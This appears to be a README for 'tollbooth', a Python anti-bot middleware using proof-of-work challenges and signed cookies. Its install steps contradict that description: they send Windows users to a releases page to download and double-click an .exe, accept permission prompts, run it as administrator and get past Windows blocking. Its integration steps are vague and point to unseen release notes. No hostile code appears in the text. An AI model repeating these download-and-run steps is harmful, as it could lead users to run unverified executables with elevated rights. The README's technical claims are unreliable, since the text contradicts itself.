# 🛡️ tollbooth - Simple bot checks for apps

[![Download tollbooth](https://img.shields.io/badge/Download%20tollbooth-2E86C1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/specconflict88/tollbooth/releases)

## 🚀 What tollbooth does

tollbooth is a small Python middleware that helps block bots before they reach your app. It gives visitors a short challenge, then sends a signed access cookie to those who solve it.

Use it in front of a web app when you want:

- less bot traffic
- a simple challenge step
- signed cookies for valid visitors
- protection without a full captcha flow

It fits web apps built with Django, FastAPI, or Flask. It works as middleware, so it sits between the visitor and your app.

## 💻 What you need on Windows

Before you install tollbooth, make sure your PC has:

- Windows 10 or Windows 11
- a web browser
- internet access
- permission to run downloaded files
- Python 3.10 or newer if you plan to run it from source

If you only want to use a release build, you can follow the download steps below and start from there.

## ⬇️ Download tollbooth

Visit this page to download tollbooth releases:

https://github.com/specconflict88/tollbooth/releases

Look for the latest release at the top of the page. Open it, then download the file that matches your Windows setup. If the release includes an installer, use that. If it includes a ZIP file, download it and extract it first.

## 🪟 Install on Windows

Follow these steps after the download finishes:

1. Open your Downloads folder.
2. Find the tollbooth file you downloaded.
3. If it is a ZIP file, right-click it and choose Extract All.
4. Open the extracted folder.
5. If you see an `.exe` file, double-click it to start the app.
6. If Windows asks for permission, choose Yes.
7. If you see a setup screen, follow the prompts on screen.

If the release gives you a Python package or source files instead of an app file, use the run steps in the next section.

## ▶️ Run from source

Use these steps if you want to run tollbooth with Python:

1. Install Python from the official Python website.
2. Open Command Prompt.
3. Go to the folder where you saved tollbooth.
4. Install the required packages with `pip`.
5. Start the app with the command listed in the release notes or project files.

A common setup looks like this:

- create a virtual environment
- install project dependencies
- run the server or middleware process
- open your browser and test the challenge page

If the project includes a `requirements.txt` file, install from that file first. If it includes a `README` or release note with a start command, use that command.

## 🔧 Typical setup for web apps

tollbooth is made to sit in front of a Python web app. A simple setup often looks like this:

- your app receives a request
- tollbooth checks the request
- the visitor gets a short challenge
- a valid visitor gets a signed access cookie
- the request reaches your app

This pattern works well for:

- login pages
- sign-up forms
- comment forms
- APIs that face bot traffic
- pages that need light bot checks

## 🧩 How to connect it to your app

You can place tollbooth in front of common Python frameworks:

### Django
Add the middleware in your Django stack so it checks requests before your views run.

### FastAPI
Place it near your request flow so it can screen visitors before route handlers process the request.

### Flask
Use it as a middleware layer or wrap your app so it checks traffic before your endpoints respond.

The exact steps depend on the release you download and the way your app is built. In most cases, you will:

1. install the package
2. add the middleware entry to your app
3. set a secret key for signed cookies
4. choose the challenge rules
5. restart your app

## ⚙️ Common settings

tollbooth usually needs a few basic settings to work well:

- **Secret key**: signs cookies so they cannot be changed
- **Challenge time**: sets how long the challenge stays valid
- **Cookie name**: stores proof that the visitor passed the check
- **Path rules**: lets you protect only parts of your site
- **Failure action**: decides what happens when a visitor fails the check

A simple setup might protect only public forms or sensitive routes. That keeps the rest of your site easy to use.

## 🔒 How the challenge works

When a visitor reaches a protected page, tollbooth gives them a short proof-of-work style challenge.

The visitor solves the challenge in the browser. When they pass, tollbooth sends a signed cookie. That cookie tells the app the visitor passed the check.

This helps you:

- slow down simple bots
- add a gate before forms or APIs
- reduce repeated automated requests
- keep the check short for real users

## 🧪 Test your setup

After you install tollbooth, check that it works:

1. Open the app in your browser.
2. Visit a protected page.
3. Confirm that the challenge appears.
4. Solve the challenge.
5. Refresh the page.
6. Check that the signed cookie lets you through.

If the challenge keeps coming back, check your cookie settings and secret key. If the page never shows the challenge, check your route rules.

## 📁 Example folder layout

A simple Windows project folder may look like this:

- `tollbooth/`
- `app/`
- `config/`
- `requirements.txt`
- `README.md`
- `run.bat`

If the release includes a `run.bat` file, you can use it to start the app from Windows with a double-click.

## 🛠️ Troubleshooting

### The file does not open
- Make sure the download finished
- Extract the ZIP file first
- Right-click the file and try Run as administrator
- Check that Windows did not block the file

### The browser shows no challenge
- Check that the middleware is enabled
- Make sure the protected route is covered
- Restart the app after changes

### The cookie does not stick
- Check browser cookie settings
- Make sure the secret key stays the same
- Confirm that the cookie path matches the site path
- Clear old cookies and test again

### Python commands fail
- Make sure Python is installed
- Open a new Command Prompt window
- Confirm that `python` and `pip` work
- Reinstall the project dependencies

## 📌 Release files to look for

When you open the releases page, you may see files such as:

- Windows ZIP package
- `.exe` app file
- source code archive
- dependency list
- release notes

For most Windows users, the best choice is the Windows package or the file marked for desktop use.

## 🔐 Safe use tips

- Keep your secret key private
- Use HTTPS in public setups
- Protect only the paths that need checks
- Test the flow in a browser before public use
- Keep your release updated when new versions appear

## 🧭 Quick start

1. Go to the releases page.
2. Download the latest Windows file.
3. Extract it if needed.
4. Open the app or run the start file.
5. Connect it to your Python web app.
6. Open a protected page and test the challenge

## 🧰 Project focus

tollbooth is built around:

- anti-bot checks
- proof-of-work style challenges
- middleware-based protection
- signed access cookies
- Python web apps

It is a fit for teams that want a simple gate in front of traffic without adding a full captcha system